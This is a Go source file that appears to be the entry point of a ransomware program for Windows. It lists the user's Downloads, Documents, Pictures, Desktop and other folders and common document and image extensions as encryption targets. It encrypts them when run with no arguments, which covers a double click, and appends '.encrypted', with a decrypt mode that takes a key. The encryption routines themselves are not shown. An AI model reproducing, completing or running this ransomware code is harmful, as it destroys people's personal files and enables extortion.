package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
)

var (
	// Base directory
	BaseDir = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))

	// Directories inside BaseDir to loop over
	InterestingDirs = []string{"Downloads", "Videos", "Pictures", "Documents", "Music", "Desktop"}

	// Interesting extensions to match files
	InterestingExtensions = []string{"docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}

	// Files to encrypt that match the extensions pattern
	MatchedFiles []string

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"
)

func main() {
	// Fun ASCII
	printBanner()

	// Execution locked for windows
	checkOS()

	args := os.Args

	// If the program is executed by double click or directly from terminal with no arguments...
	if len(args) < 2 {
		encryptFiles()

		// Wait for enter to exit
		var s string
		fmt.Println("Press enter to quit")
		fmt.Scanf("%s", &s)
		return
	}

	switch args[1] {
	case "-h", "help", "h":
		usage("")
	case "decrypt":
		if len(args) != 3 {
			usage("Missing decryption key")
		}

		decryptFiles(os.Args[2])
	}

}

// Execute only on windows
func checkOS() {
	if runtime.GOOS != "windows" {
		log.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
